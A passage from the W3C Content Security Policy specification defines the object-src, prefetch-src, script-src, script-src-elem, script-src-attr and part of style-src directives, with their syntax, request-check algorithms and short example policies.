  content may be loaded. The syntax for the directive’s name and value is
  described by the following ABNF:</p>
<pre>directive-name  = "object-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list⑧">serialized-source-list</a>
</pre>
    <div class="example" id="example-567c9ecc">
     <a class="self-link" href="#example-567c9ecc"></a> Given a page with the following Content Security Policy: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①④">Content-Security-Policy</a>: <a data-link-type="dfn" href="#object-src" id="ref-for-object-src③">object-src</a> https://example.com/
</pre>
     <p>Fetches for the following code will return a network errors, as the URL
    provided do not match <code>object-src</code>’s <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists⑧">source list</a>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>embed</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/flash"</c-><c- p>>&lt;/</c-><c- f>embed</c-><c- p>></c->
<c- p>&lt;</c-><c- f>object</c-> <c- e>data</c-><c- o>=</c-><c- s>"https://example.org/flash"</c-><c- p>>&lt;/</c-><c- f>object</c-><c- p>></c->
</pre>
    </div>
    <p>If plugin content is loaded without an associated URL (perhaps an <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element" id="ref-for-the-object-element">object</a></code> element lacks a <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-object-data" id="ref-for-attr-object-data">data</a></code> attribute, but loads some default plugin based
  on the specified <code>type</code>), it MUST be blocked if <code>object-src</code>’s value is <code>'none'</code>, but will otherwise be allowed.</p>
    <p class="note" role="note"><span class="marker">Note:</span> The <code>object-src</code> directive acts upon any request made on behalf of
  an <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element" id="ref-for-the-object-element①">object</a></code> or <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element" id="ref-for-the-embed-element">embed</a></code> element. This includes requests
  which would populate the <a data-link-type="dfn">nested browsing context</a> generated by the
  former two (also including navigations). This is true even when the data is
  semantically equivalent to content which would otherwise be restricted by
  another directive, such as an <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element" id="ref-for-the-object-element②">object</a></code> element with a <code>text/html</code> MIME
  type.</p>
    <p class="note" role="note"><span class="marker">Note:</span> When a plugin resource is navigated to directly (that is, as a <a data-link-type="dfn">plugin document</a> in the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/document-sequences.html#top-level-browsing-context" id="ref-for-top-level-browsing-context">top-level browsing context</a> or a <a data-link-type="dfn">nested browsing context</a>, and not as an embedded
  subresource via <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element" id="ref-for-the-embed-element①">embed</a></code> or <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element" id="ref-for-the-object-element③">object</a></code>), any <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object④⑧">policy</a> delivered along
  with that resource will be applied to the <a data-link-type="dfn">plugin document</a>. This means, for instance, that
  developers can prevent the execution of arbitrary resources as plugin content by delivering the
  policy <code>object-src 'none'</code> along with a response. Given plugins' power (and the
  sometimes-interesting security model presented by Flash and others), this could mitigate the risk
  of attack vectors like <a href="https://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/">Rosetta Flash</a>.</p>
    <h5 class="heading settled algorithm" data-algorithm="object-src Pre-request check" data-level="6.1.9.1" id="object-src-pre-request"><span class="secno">6.1.9.1. </span><span class="content"> <code>object-src</code> Pre-request check </span><a class="self-link" href="#object-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check①①">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③⑧">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object④⑨">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>object-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②③">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="object-src Post-request check" data-level="6.1.9.2" id="object-src-post-request"><span class="secno">6.1.9.2. </span><span class="content"> <code>object-src</code> Post-request check </span><a class="self-link" href="#object-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①②">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③⑨">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②⑥">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤⓪">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>object-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②④">value</a>,
  and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.10" id="directive-prefetch-src"><span class="secno">6.1.10. </span><span class="content"><code>prefetch-src</code></span><a class="self-link" href="#directive-prefetch-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="prefetch-src">prefetch-src</dfn> directive restricts the URLs from which resources may be
  prefetched or prerendered. The syntax for the directive’s name and value is described by the
  following ABNF:</p>
<pre>directive-name  = "prefetch-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list⑨">serialized-source-list</a>
</pre>
    <div class="example" id="example-7fa0d569">
     <a class="self-link" href="#example-7fa0d569"></a> Given a page with the following Content Security Policy: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⑤">Content-Security-Policy</a>: <a data-link-type="dfn" href="#prefetch-src" id="ref-for-prefetch-src②">prefetch-src</a> https://example.com/
</pre>
     <p>Fetches for the following code will return network errors, as the URLs provided do not match <code>prefetch-src</code>’s <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists⑨">source list</a>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>link</c-> <c- e>rel</c-><c- o>=</c-><c- s>"prefetch"</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/"</c-><c- p>>&lt;/</c-><c- f>link</c-><c- p>></c->
<c- p>&lt;</c-><c- f>link</c-> <c- e>rel</c-><c- o>=</c-><c- s>"prerender"</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/"</c-><c- p>>&lt;/</c-><c- f>link</c-><c- p>></c->
</pre>
    </div>
    <h5 class="heading settled algorithm" data-algorithm="prefetch-src Pre-request check" data-level="6.1.10.1" id="prefetch-src-pre-request"><span class="secno">6.1.10.1. </span><span class="content"> <code>prefetch-src</code> Pre-request check </span><a class="self-link" href="#prefetch-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check①②">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④⓪">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤①">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>prefetch-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>,
  this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②⑤">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="prefetch-src Post-request check" data-level="6.1.10.2" id="prefetch-src-post-request"><span class="secno">6.1.10.2. </span><span class="content"> <code>prefetch-src</code> Post-request check </span><a class="self-link" href="#prefetch-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①③">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④①">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②⑦">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤②">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>prefetch-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②⑥">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.11" id="directive-script-src"><span class="secno">6.1.11. </span><span class="content"><code>script-src</code></span><a class="self-link" href="#directive-script-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="script-src">script-src</dfn> directive restricts the locations from which scripts
  may be executed. This includes not only URLs loaded directly into <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script③">script</a></code> elements, but also things like inline script blocks and XSLT stylesheets <a data-link-type="biblio" href="#biblio-xslt" title="XSL Transformations (XSLT) Version 1.0">[XSLT]</a> which can trigger script execution. The syntax for the directive’s
  name and value is described by the following ABNF:</p>
<pre>directive-name  = "script-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①⓪">serialized-source-list</a>
</pre>
    <p>The <code>script-src</code> directive acts as a default fallback for all <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#request-destination-script-like" id="ref-for-request-destination-script-like">script-like</a> destinations (including worker-specific destinations if <a data-link-type="dfn" href="#worker-src" id="ref-for-worker-src②"><code>worker-src</code></a> is not present). Unless granularity is desired <code>script-src</code> should
  be used in favor of <a data-link-type="dfn" href="#script-src-attr" id="ref-for-script-src-attr②"><code>script-src-attr</code></a> and <a data-link-type="dfn" href="#script-src-elem" id="ref-for-script-src-elem③"><code>script-src-elem</code></a> as in most situations there is no particular reason to have separate lists of
  permissions for inline event handlers and <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script④">script</a></code> elements.</p>
    <p>The <code>script-src</code> directive governs five things:</p>
    <ol>
     <li data-md>
      <p>Script <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④②">requests</a> MUST pass through <a href="#should-block-request" id="ref-for-should-block-request④">§ 4.1.3 Should request be blocked by Content Security Policy?</a>.</p>
     <li data-md>
      <p>Script <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②⑧">responses</a> MUST pass through <a href="#should-block-response" id="ref-for-should-block-response⑤">§ 4.1.4 Should response to request be blocked by Content Security Policy?</a>.</p>
     <li data-md>
      <p>Inline <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script⑤">script</a></code> blocks MUST pass through <a href="#should-block-inline" id="ref-for-should-block-inline④">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a>. Their
  behavior will be blocked unless every policy allows inline script, either
  implicitly by not specifying a <code>script-src</code> (or <code>default-src</code>) directive,
  or explicitly, by specifying "<code>unsafe-inline</code>", a <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source②">nonce-source</a> or a <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source②">hash-source</a> that matches
  the inline block.</p>
     <li data-md>
      <p>The following JavaScript execution sinks are gated on the "<code>unsafe-eval</code>"
  source expression:</p>
      <ul>
       <li data-md>
        <p><code class="idl"><a data-link-type="idl" href="https://tc39.github.io/ecma262#sec-eval-x" id="ref-for-sec-eval-x①">eval()</a></code></p>
       <li data-md>
        <p><code class="idl"><a data-link-type="idl" href="https://tc39.github.io/ecma262#sec-function-objects" id="ref-for-sec-function-objects">Function()</a></code></p>
       <li data-md>
        <p><code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-settimeout" id="ref-for-dom-settimeout">setTimeout()</a></code> with an initial argument which is not callable.</p>
       <li data-md>
        <p><code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-setinterval" id="ref-for-dom-setinterval">setInterval()</a></code> with an initial argument which is not callable.</p>
      </ul>
      <p class="note" role="note"><span class="marker">Note:</span> If a user agent implements non-standard sinks like <code>setImmediate()</code> or <code>execScript()</code>, they SHOULD also be gated on "<code>unsafe-eval</code>".
  Note: Since "<code>unsafe-eval</code>" acts as a global page flag, <a data-link-type="dfn" href="#script-src-attr" id="ref-for-script-src-attr③"><code>script-src-attr</code></a> and <a data-link-type="dfn" href="#script-src-elem" id="ref-for-script-src-elem④"><code>script-src-elem</code></a> are not used when performing this check, instead <code>script-src</code> (or it’s fallback directive) is always used.</p>
     <li data-md>
      <p>Navigation to <code>javascript:</code> URLs MUST pass through <a href="#script-src-inline">§ 6.1.11.3 script-src Inline Check</a>.</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="script-src Pre-request check" data-level="6.1.11.1" id="script-src-pre-request"><span class="secno">6.1.11.1. </span><span class="content"> <code>script-src</code> Pre-request check </span><a class="self-link" href="#script-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check①③">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④③">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤③">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>script-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>Return the result of executing <a href="#script-pre-request">§ 6.6.1.1 Script directives pre-request check</a> on <var>request</var>,
  this directive, and <var>policy</var>.</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="script-src Post-request check" data-level="6.1.11.2" id="script-src-post-request"><span class="secno">6.1.11.2. </span><span class="content"> <code>script-src</code> Post-request check </span><a class="self-link" href="#script-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①④">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④④">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②⑨">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤④">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>script-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>Return the result of executing <a href="#script-post-request">§ 6.6.1.2 Script directives post-request check</a> on <var>request</var>, <var>response</var>, this directive, and <var>policy</var>.</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="script-src Inline Check" data-level="6.1.11.3" id="script-src-inline"><span class="secno">6.1.11.3. </span><span class="content"> <code>script-src</code> Inline Check </span><a class="self-link" href="#script-src-inline"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-inline-check" id="ref-for-directive-inline-check④">inline check</a> algorithm is as follows:</p>
    <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element③">Element</a></code> (<var>element</var>), a string (<var>type</var>), a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤⑤">policy</a> (<var>policy</var>) and a string (<var>source</var>):</p>
    <ol>
     <li data-md>
      <p class="assertion">Assert: <var>element</var> is not <code>null</code> or <var>type</var> is "<code>navigation</code>".</p>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-inline-check">§ 6.7.2 Get the effective directive for inline checks</a> on <var>type</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>script-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-element-to-source-list">§ 6.6.3.3 Does element match source list for type and source?</a> on <var>element</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②⑦">value</a>, <var>type</var>,
  and <var>source</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.12" id="directive-script-src-elem"><span class="secno">6.1.12. </span><span class="content"><code>script-src-elem</code></span><a class="self-link" href="#directive-script-src-elem"></a></h4>
    <p>The syntax for the directive’s name and value is described by the following ABNF:</p>
<pre>directive-name  = "script-src-elem"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①①">serialized-source-list</a>
</pre>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="script-src-elem">script-src-elem</dfn> directive applies to all script requests and
  script blocks. Attributes that execute script (inline event handlers) are
  controlled via <a data-link-type="dfn" href="#script-src-attr" id="ref-for-script-src-attr④"><code>script-src-attr</code></a>.</p>
    <p>As such, the following differences exist when comparing to <code>script-src</code>:</p>
    <ul>
     <li data-md>
      <p><code>script-src-elem</code> applies to inline checks whose <code>|type|</code> is "<code>script</code>" and
"<code>navigation</code>" (and is ignored for inline checks whose <code>|type|</code> is "<code>script attribute</code>").</p>
     <li data-md>
      <p><code>script-src-elem</code>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②⑧">value</a> is not used for JavaScript
execution sink checks that are gated on the "<code>unsafe-eval</code>" check.</p>
     <li data-md>
      <p><code>script-src-elem</code> is not used as a fallback for the <code>worker-src</code> directive.
The <code>worker-src</code> checks still fall back on the <code>script-src</code> directive.</p>
    </ul>
    <h5 class="heading settled algorithm" data-algorithm="script-src-elem Pre-request check" data-level="6.1.12.1" id="script-src-elem-pre-request"><span class="secno">6.1.12.1. </span><span class="content"> <code>script-src-elem</code> Pre-request check </span><a class="self-link" href="#script-src-elem-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check①④">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④⑤">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤⑥">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>script-src-elem</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>Return the result of executing <a href="#script-pre-request">§ 6.6.1.1 Script directives pre-request check</a> on <var>request</var>,
  this directive, and <var>policy</var>.</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="script-src-elem Post-request check" data-level="6.1.12.2" id="script-src-elem-post-request"><span class="secno">6.1.12.2. </span><span class="content"> <code>script-src-elem</code> Post-request check </span><a class="self-link" href="#script-src-elem-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①⑤">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④⑥">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③⓪">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤⑦">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>script-src-elem</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>Return the result of executing <a href="#script-post-request">§ 6.6.1.2 Script directives post-request check</a> on <var>request</var>, <var>response</var>, this directive, and <var>policy</var>.</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="script-src-elem Inline Check" data-level="6.1.12.3" id="script-src-elem-inline"><span class="secno">6.1.12.3. </span><span class="content"> <code>script-src-elem</code> Inline Check </span><a class="self-link" href="#script-src-elem-inline"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-inline-check" id="ref-for-directive-inline-check⑤">inline check</a> algorithm is as follows:</p>
    <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element④">Element</a></code> (<var>element</var>), a string (<var>type</var>), a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤⑧">policy</a> (<var>policy</var>) and a string (<var>source</var>):</p>
    <ol>
     <li data-md>
      <p class="assertion">Assert: <var>element</var> is not <code>null</code> or <var>type</var> is "<code>navigation</code>".</p>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-inline-check">§ 6.7.2 Get the effective directive for inline checks</a> on <var>type</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>script-src-elem</code>, and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-element-to-source-list">§ 6.6.3.3 Does element match source list for type and source?</a> on <var>element</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②⑨">value</a>, <var>type</var>,
  and <var>source</var> is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.13" id="directive-script-src-attr"><span class="secno">6.1.13. </span><span class="content"><code>script-src-attr</code></span><a class="self-link" href="#directive-script-src-attr"></a></h4>
    <p>The syntax for the directive’s name and value is described by the following ABNF:</p>
<pre>directive-name  = "script-src-attr"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①②">serialized-source-list</a>
</pre>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="script-src-attr">script-src-attr</dfn> directive applies to event handlers and, if present,
  it will override the <code>script-src</code> directive for relevant checks.</p>
    <h5 class="heading settled algorithm" data-algorithm="script-src-attr Inline Check" data-level="6.1.13.1" id="script-src-attr-inline"><span class="secno">6.1.13.1. </span><span class="content"> <code>script-src-attr</code> Inline Check </span><a class="self-link" href="#script-src-attr-inline"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-inline-check" id="ref-for-directive-inline-check⑥">inline check</a> algorithm is as follows:</p>
    <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element⑤">Element</a></code> (<var>element</var>), a string (<var>type</var>), a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤⑨">policy</a> (<var>policy</var>) and a string (<var>source</var>):</p>
    <ol>
     <li data-md>
      <p class="assertion">Assert: <var>element</var> is not <code>null</code> or <var>type</var> is "<code>navigation</code>".</p>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-inline-check">§ 6.7.2 Get the effective directive for inline checks</a> on <var>type</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>script-src-attr</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-element-to-source-list">§ 6.6.3.3 Does element match source list for type and source?</a> on <var>element</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③⓪">value</a>, <var>type</var>,
  and <var>source</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.14" id="directive-style-src"><span class="secno">6.1.14. </span><span class="content"><code>style-src</code></span><a class="self-link" href="#directive-style-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="style-src">style-src</dfn> directive restricts the locations from which style
  may be applied to a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①②">Document</a></code>. The syntax for the directive’s name and
  value is described by the following ABNF:</p>
<pre>directive-name  = "style-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①③">serialized-source-list</a>
</pre>
    <p>The <code>style-src</code> directive governs several things:</p>
    <ol>
     <li data-md>
      <p>Style <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request④⑦">requests</a> MUST pass through <a href="#should-block-request" id="ref-for-should-block-request⑤">§ 4.1.3 Should request be blocked by Content Security Policy?</a>. This
  includes:</p>
      <ol>
       <li data-md>
        <p>Stylesheet requests originating from a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-link-element" id="ref-for-the-link-element①">link</a></code> element.</p>
       <li data-md>
        <p>Stylesheet requests originating from the <a class="css" data-link-type="at-rule" href="https://www.w3.org/TR/css-cascade-5/#at-ruledef-import" id="ref-for-at-ruledef-import"><code>@import</code></a> rule.</p>
       <li data-md>
        <p>Stylesheet requests originating from a <code>Link</code> HTTP response header
  field <a data-link-type="biblio" href="#biblio-rfc8288" title="Web Linking">[RFC8288]</a>.</p>
      </ol>
     <li data-md>
      <p><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response③①">Responses</a> to style requests MUST pass through <a href="#should-block-response" id="ref-for-should-block-response⑥">§ 4.1.4 Should response to request be blocked by Content Security Policy?</a>.</p>
     <li data-md>
